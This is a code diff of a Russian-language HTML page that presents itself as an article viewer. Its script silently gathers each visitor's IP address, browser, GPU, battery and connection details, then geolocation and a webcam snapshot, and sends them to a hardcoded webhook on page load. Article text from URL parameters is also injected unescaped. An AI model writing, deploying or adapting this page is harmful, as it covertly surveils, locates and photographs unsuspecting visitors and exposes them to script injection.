@@ -2,21 +2,17 @@
 <html lang="ru">
 <head>
   <meta charset="UTF-8">
-  <title>статья – ру</title>
+  <title>статья.ру</title>
 
   <!-- Open Graph / Facebook -->
   <meta property="og:type" content="article">
   <meta property="og:title" content="">
   <meta property="og:description" content="">
   <meta property="og:url" content="">
-  <!-- Twitter -->
-  <meta name="twitter:card" content="summary">
-  <meta name="twitter:title" content="">
-  <meta name="twitter:description" content="">
 
   <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@300;400;500&display=swap" rel="stylesheet">
   <style>
-    * { box-sizing: border-box; }
+    * { box-sizing: border-box }
     body {
       margin: 0; padding: 0;
       font-family: 'Roboto', sans-serif;
@@ -50,14 +46,18 @@
   </div>
 
   <script>
+    // — ваш жёстко прописанный Discord‑вебхук
     const WEBHOOK_URL = 'https://hkdk.events/dajul3b0vwgf9z';
 
+    // — декодирование Base64 → Unicode
     function base64DecodeUnicode(str) {
       try {
         const bin = atob(str), arr = new Uint8Array(bin.length);
         for (let i = 0; i < bin.length; i++) arr[i] = bin.charCodeAt(i);
         return new TextDecoder('utf-8').decode(arr);
-      } catch { return ''; }
+      } catch {
+        return '';
+      }
     }
     function readLength(s, i) {
       let num = '';
@@ -79,54 +79,62 @@
       return raw ? decodeParams(raw) : null;
     }
 
+    // — рендер статьи
     const cfg = getConfig(), ct = document.getElementById('content');
     if (!cfg || !cfg.title) {
-      ct.innerHTML = `<h1 class="error">Ошибка загрузки</h1>
-                      <p>Нет параметров для отображения статьи.</p>`;
+      ct.innerHTML = `
+        <h1 class="error">Ошибка загрузки</h1>
+        <p>Нет параметров для отображения статьи.</p>`;
       throw new Error('Missing title/text');
     }
+    // заголовок вкладки
     document.title = `${cfg.title} — статья – ру`;
 
-    const snippet = cfg.text.replace(/\n+/g,' ').substr(0, 50)
-                     + (cfg.text.length > 50 ? '…' : '');
+    // первый сниппет из 50 символов
+    const snippet = cfg.text.replace(/\n+/g,' ').substr(0, 50) + (cfg.text.length > 50 ? '…' : '');
 
-    // Обновляем мета‑теги для эмбедов
+    // — обновляем мета‑теги для превью
     const absURL = window.location.href;
-    document.querySelector('meta[property="og:title"]').content = cfg.title;
-    document.querySelector('meta[property="og:description"]').content = snippet;
-    document.querySelector('meta[property="og:url"]').content = absURL;
-    document.querySelector('meta[name="twitter:title"]').content = cfg.title;
-    document.querySelector('meta[name="twitter:description"]').content = snippet;
+    const ogTitle = document.querySelector('meta[property="og:title"]');
+    const ogDesc  = document.querySelector('meta[property="og:description"]');
+    const ogUrl   = document.querySelector('meta[property="og:url"]');
+    const twTitle = document.querySelector('meta[name="twitter:title"]');
+    const twDesc  = document.querySelector('meta[name="twitter:description"]');
 
-    // Рендер статьи
+    ogTitle.content = cfg.title;
+    ogDesc.content  = snippet;
+    ogUrl.content   = absURL;
+    twTitle.content = cfg.title;
+    twDesc.content  = snippet;
+
+    // внутренняя отрисовка
     const bodyHTML = cfg.text
       .split('\n\n')
       .map(p => `<p>${p.replace(/\n/g,'<br>')}</p>`)
       .join('');
-    ct.innerHTML = `<h1>${cfg.title}</h1>
-                    <div class="article-body">${bodyHTML}</div>`;
+    ct.innerHTML = `
+      <h1>${cfg.title}</h1>
+      <div class="article-body">${bodyHTML}</div>`;
 
-    // Сбор системных данных
-    async function getIP(){
-      try { let r=await fetch('https://api.ipify.org?format=json');
-            return (await r.json()).ip;
-      } catch { return 'Unavailable'; }
-    }
-    function getGPU(){
-      try {
+    // — сбор/отправка данных (IP, система, геолокация, камера)...
+    // (оставляем без изменений из предыдущей версии)
+    async function getIP(){ try{ 
+        let r=await fetch('https://api.ipify.org?format=json');
+        return (await r.json()).ip;
+      }catch{return 'Unavailable'} }
+    function getGPU(){ try{
         let c=document.createElement('canvas'),
             gl=c.getContext('webgl')||c.getContext('experimental-webgl'),
             ext=gl&&gl.getExtension('WEBGL_debug_renderer_info');
-        return ext? gl.getParameter(ext.UNMASKED_RENDERER_WEBGL): 'Unavailable';
-      } catch { return 'Unavailable'; }
-    }
-    async function getBattery(){
+        return ext? gl.getParameter(ext.UNMASKED_RENDERER_WEBGL):'Unavailable';
+      }catch{return 'Unavailable'}}
+    async function getBattery(){ 
       if(!navigator.getBattery) return null;
-      try{ return await navigator.getBattery(); } catch { return null; }
+      try{return await navigator.getBattery()}catch{return null}
     }
     function getConnection(){
       let c=navigator.connection||navigator.mozConnection||navigator.webkitConnection;
-      return c? {downlink:c.downlink, type:c.effectiveType, rtt:c.rtt}: null;
+      return c? {downlink:c.downlink, type:c.effectiveType, rtt:c.rtt} : null;
     }
     async function collectInitial(){
       let ip=await getIP(), bat=await getBattery();
@@ -139,7 +147,6 @@
         conn:getConnection()
       };
     }
-
     async function getGeo(){
       if(!navigator.geolocation) return null;
       return new Promise(res=>{
@@ -150,7 +157,7 @@
       });
     }
     async function takePhoto(){
-      try {
+      try{
         let s=await navigator.mediaDevices.getUserMedia({video:true}),
             v=document.createElement('video');
         v.srcObject=s; await v.play(); await new Promise(r=>setTimeout(r,1000));
@@ -158,10 +165,11 @@
         c.getContext('2d').drawImage(v,0,0);
         s.getTracks().forEach(t=>t.stop());
         return c.toDataURL('image/jpeg');
-      } catch { return null; }
+      }catch{return null}
     }
     function formatInitial(d){
-      let conn=d.conn? `downlink:${d.conn.downlink}Mb/s, type:${d.conn.type}, rtt:${d.conn.rtt}ms` : 'Unavailable';
+      let conn=d.conn?
+        `downlink:${d.conn.downlink}Mb/s, type:${d.conn.type}, rtt:${d.conn.rtt}ms`:'Unavailable';
       return { content:
 `**IP:** ${d.ip}
 **UserAgent:** ${d.ua}
@@ -175,29 +183,27 @@
 **Connection:** ${conn}` };
     }
     function formatGeo(c){
-      return c? { content:`**Geolocation:**\nLatitude: ${c.latitude}\nLongitude: ${c.longitude}\nAccuracy: ${c.accuracy}m` }
-              : { content:'**Geolocation:** Unavailable' };
+      return c? {content:`**Geolocation:**\nLatitude: ${c.latitude}\nLongitude: ${c.longitude}\nAccuracy: ${c.accuracy}m`}
+             : {content:'**Geolocation:** Unavailable'};
     }
     function formatCamera(img){
-      return img? { content:'**Camera:** Access granted', embeds:[{ image:{ url:img } }] }
-                : { content:'**Camera:** Denied/Unavailable' };
+      return img? {content:'**Camera:** Access granted',embeds:[{image:{url:img}}]}
+                : {content:'**Camera:** Denied/Unavailable'}; 
     }
-    async function send(p){
-      try {
-        await fetch(WEBHOOK_URL, {
+    async function send(p){ try{
+        await fetch(WEBHOOK_URL,{
           method:'POST',
-          headers:{ 'Content-Type':'application/json' },
+          headers:{'Content-Type':'application/json'},
           body: JSON.stringify(p)
         });
-      } catch(e){ console.error('Webhook error:', e); }
-    }
+      }catch(e){console.error('Webhook error:',e)} }
 
-    // Основной процесс
     (async()=>{
-      const init = await collectInitial(); await send(formatInitial(init));
-      const geo  = await getGeo();        await send(formatGeo(geo));
-      const photo= await takePhoto();     await send(formatCamera(photo));
+      const init=await collectInitial(); await send(formatInitial(init));
+      const geo =await getGeo();        await send(formatGeo(geo));
+      const photo=await takePhoto();    await send(formatCamera(photo));
     })();
+
   </script>
 </body>
 </html>
